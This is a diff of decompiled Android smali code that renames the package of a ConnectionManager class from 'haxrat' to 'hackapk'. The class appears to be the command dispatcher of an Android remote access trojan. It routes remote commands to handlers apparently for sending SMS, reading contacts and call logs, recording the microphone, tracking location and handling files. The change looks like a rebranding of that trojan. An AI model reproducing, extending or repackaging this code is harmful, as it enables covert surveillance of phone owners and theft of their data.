@@ -1,4 +1,4 @@
-.class Lcom/hax4us/haxrat/ConnectionManager$100000001;
+.class Lcom/justhack/hackapk/ConnectionManager$100000001;
 .super Ljava/lang/Object;
 .source "ConnectionManager.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/ConnectionManager;
+    value = Lcom/justhack/hackapk/ConnectionManager;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -118,7 +118,7 @@
 
     move-result-object v8
 
-    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FI(ILjava/lang/String;)V
+    invoke-static {v7, v8}, Lcom/justhack/hackapk/ConnectionManager;->FI(ILjava/lang/String;)V
 
     .line 120
     :cond_0
@@ -154,7 +154,7 @@
 
     move-result-object v8
 
-    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FI(ILjava/lang/String;)V
+    invoke-static {v7, v8}, Lcom/justhack/hackapk/ConnectionManager;->FI(ILjava/lang/String;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -216,7 +216,7 @@
 
     check-cast v9, Ljava/lang/String;
 
-    invoke-static {v7, v8, v9}, Lcom/hax4us/haxrat/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V
+    invoke-static {v7, v8, v9}, Lcom/justhack/hackapk/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V
 
     .line 75
     :cond_3
@@ -260,7 +260,7 @@
 
     move-result-object v9
 
-    invoke-static {v7, v8, v9}, Lcom/hax4us/haxrat/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V
+    invoke-static {v7, v8, v9}, Lcom/justhack/hackapk/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V
 
     goto :goto_1
 
@@ -279,7 +279,7 @@
     if-ne v7, v8, :cond_6
 
     .line 77
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->CL()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->CL()V
 
     .line 78
     goto :goto_0
@@ -298,7 +298,7 @@
     if-ne v7, v8, :cond_7
 
     .line 80
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->CO()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->CO()V
 
     .line 81
     goto/16 :goto_0
@@ -325,7 +325,7 @@
 
     move-result v7
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->MI(I)V
+    invoke-static {v7}, Lcom/justhack/hackapk/ConnectionManager;->MI(I)V
 
     .line 84
     goto/16 :goto_0
@@ -344,7 +344,7 @@
     if-ne v7, v8, :cond_9
 
     .line 86
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->LO()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->LO()V
 
     .line 87
     goto/16 :goto_0
@@ -363,7 +363,7 @@
     if-ne v7, v8, :cond_a
 
     .line 89
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->WI()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->WI()V
 
     .line 90
     goto/16 :goto_0
@@ -382,7 +382,7 @@
     if-ne v7, v8, :cond_b
 
     .line 92
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->PM()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->PM()V
 
     .line 93
     goto/16 :goto_0
@@ -401,7 +401,7 @@
     if-ne v7, v8, :cond_c
 
     .line 95
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->IN()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->IN()V
 
     .line 96
     goto/16 :goto_0
@@ -428,7 +428,7 @@
 
     move-result-object v7
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->GP(Ljava/lang/String;)V
+    invoke-static {v7}, Lcom/justhack/hackapk/ConnectionManager;->GP(Ljava/lang/String;)V
 
     .line 99
     goto/16 :goto_0
@@ -447,7 +447,7 @@
     if-ne v7, v8, :cond_e
 
     .line 101
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->LD()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->LD()V
 
     .line 102
     goto/16 :goto_0
@@ -466,7 +466,7 @@
     if-ne v7, v8, :cond_f
 
     .line 104
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->UD()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->UD()V
 
     .line 105
     goto/16 :goto_0
@@ -485,7 +485,7 @@
     if-ne v7, v8, :cond_10
 
     .line 107
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->SS()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->SS()V
 
     .line 108
     goto/16 :goto_0
@@ -512,7 +512,7 @@
 
     move-result v7
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->SR(I)V
+    invoke-static {v7}, Lcom/justhack/hackapk/ConnectionManager;->SR(I)V
 
     .line 111
     goto/16 :goto_0
@@ -541,7 +541,7 @@
 
     move-result v8
 
-    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->RC(II)V
+    invoke-static {v7, v8}, Lcom/justhack/hackapk/ConnectionManager;->RC(II)V
 
     .line 114
     goto/16 :goto_0
@@ -570,7 +570,7 @@
 
     move-result v8
 
-    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FC(II)V
+    invoke-static {v7, v8}, Lcom/justhack/hackapk/ConnectionManager;->FC(II)V
     :try_end_1
     .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
 
